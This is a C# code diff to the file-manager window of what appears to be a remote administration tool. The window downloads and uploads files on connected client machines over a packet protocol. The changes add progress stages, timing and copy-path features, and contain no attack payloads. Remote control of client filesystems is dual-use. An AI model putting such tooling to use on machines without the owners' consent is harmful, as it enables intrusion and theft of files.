@@ -105,11 +105,16 @@ public partial class FileManagerWindow : Window
         {
             TxtTransferName.Text   = name.Length > 30 ? name[..30] + "…" : name;
             TxtTransferStatus.Text = status;
+            TxtTransferPct.Text    = "";
             TransferStrip.Visibility = Visibility.Visible;
         });
 
     private void HideTransfer()
-        => _ = Dispatcher.BeginInvoke(() => TransferStrip.Visibility = Visibility.Collapsed);
+        => _ = Dispatcher.BeginInvoke(() =>
+        {
+            TxtTransferPct.Text = "";
+            TransferStrip.Visibility = Visibility.Collapsed;
+        });
 
     // ── Navigation ────────────────────────────────────
 
@@ -162,8 +167,9 @@ public partial class FileManagerWindow : Window
         var dlg = new Microsoft.Win32.SaveFileDialog { FileName = row.Name };
         if (dlg.ShowDialog() != true) return;
 
+        var sw = System.Diagnostics.Stopwatch.StartNew();
         TxtStatus.Text = $"Downloading {row.Name}…";
-        ShowTransfer(row.Name, "Downloading…");
+        ShowTransfer(row.Name, "Requesting…");
         try
         {
             _pendingData = new TaskCompletionSource<string>();
@@ -172,15 +178,22 @@ public partial class FileManagerWindow : Window
                 Type = PacketType.FmDownload,
                 Data = JsonConvert.SerializeObject(new FmDownloadData { Path = _currentPath.TrimEnd('\\', '/') + "\\" + row.Name })
             });
+            ShowTransfer(row.Name, "Receiving…");
             var json = await _pendingData.Task.WaitAsync(TimeSpan.FromSeconds(60));
             var result = JsonConvert.DeserializeObject<FmFileDataResult>(json);
             if (result == null || !string.IsNullOrEmpty(result.Error)) { TxtStatus.Text = $"Error: {result?.Error}"; return; }
+            ShowTransfer(row.Name, "Decoding…");
             var bytes = Convert.FromBase64String(result.Data);
+            TxtTransferPct.Text = "50%";
+            ShowTransfer(row.Name, "Writing…");
             await File.WriteAllBytesAsync(dlg.FileName, bytes);
+            sw.Stop();
+            TxtTransferPct.Text = "100%";
             NotificationService.NotifyDownloadComplete();
-            TxtStatus.Text = $"Downloaded: {row.Name}  ({bytes.Length:N0} bytes)";
+            var elapsed = sw.Elapsed.TotalSeconds < 60 ? $"{sw.Elapsed.TotalSeconds:F1}s" : $"{sw.Elapsed.TotalMinutes:F0}m {sw.Elapsed.Seconds}s";
+            TxtStatus.Text = $"Downloaded: {row.Name}  ({bytes.Length:N0} B in {elapsed})";
         }
-        catch (Exception ex) { TxtStatus.Text = ex.Message; }
+        catch (Exception ex) { TxtStatus.Text = $"Download failed: {ex.Message}"; }
         finally { _pendingData = null; HideTransfer(); }
     }
 
@@ -190,23 +203,32 @@ public partial class FileManagerWindow : Window
         if (dlg.ShowDialog() != true) return;
         var destPath = Path.Combine(_currentPath, Path.GetFileName(dlg.FileName));
         var uploadName = Path.GetFileName(dlg.FileName);
+
+        var sw = System.Diagnostics.Stopwatch.StartNew();
         TxtStatus.Text = $"Uploading {uploadName}…";
-        ShowTransfer(uploadName, "Uploading…");
+        ShowTransfer(uploadName, "Reading…");
         try
         {
             var bytes = await File.ReadAllBytesAsync(dlg.FileName);
+            ShowTransfer(uploadName, $"Encoding ({bytes.Length:N0} B)…");
+            var b64 = Convert.ToBase64String(bytes);
+            TxtTransferPct.Text = "50%";
             _pendingAck = new TaskCompletionSource<string>();
+            ShowTransfer(uploadName, "Sending…");
             await _server.SendToClient(_clientId, new Packet
             {
                 Type = PacketType.FmUpload,
-                Data = JsonConvert.SerializeObject(new FmUploadData { Path = destPath, Data = Convert.ToBase64String(bytes) })
+                Data = JsonConvert.SerializeObject(new FmUploadData { Path = destPath, Data = b64 })
             });
             await _pendingAck.Task.WaitAsync(TimeSpan.FromSeconds(30));
+            sw.Stop();
+            TxtTransferPct.Text = "100%";
             NotificationService.NotifyUploadComplete();
-            TxtStatus.Text = $"Uploaded: {Path.GetFileName(dlg.FileName)}";
+            var elapsed = sw.Elapsed.TotalSeconds < 60 ? $"{sw.Elapsed.TotalSeconds:F1}s" : $"{sw.Elapsed.TotalMinutes:F0}m {sw.Elapsed.Seconds}s";
+            TxtStatus.Text = $"Uploaded: {uploadName} ({bytes.Length:N0} B in {elapsed})";
             await Navigate(_currentPath);
         }
-        catch (Exception ex) { TxtStatus.Text = ex.Message; }
+        catch (Exception ex) { TxtStatus.Text = $"Upload failed: {ex.Message}"; }
         finally { _pendingAck = null; HideTransfer(); }
     }
 
@@ -672,6 +694,24 @@ public partial class FileManagerWindow : Window
     {
         Width  = Math.Max(MinWidth,  Width  + e.HorizontalChange);
         Height = Math.Max(MinHeight, Height + e.VerticalChange);
+    }
+
+    private void GridFiles_CopyName_Click(object s, RoutedEventArgs e)
+    {
+        if (GridFiles.SelectedItem is FileEntryVM vm)
+            try { System.Windows.Clipboard.SetText(vm.Name); TxtStatus.Text = $"Copied: {vm.Name}"; } catch { }
+    }
+
+    private void GridFiles_CopyPath_Click(object s, RoutedEventArgs e)
+    {
+        if (GridFiles.SelectedItem is FileEntryVM vm)
+            try
+            {
+                var full = Path.Combine(_currentPath, vm.Name);
+                System.Windows.Clipboard.SetText(full);
+                TxtStatus.Text = $"Copied: {full}";
+            }
+            catch { }
     }
 
     private void Close_Click(object s, RoutedEventArgs e) => Close();
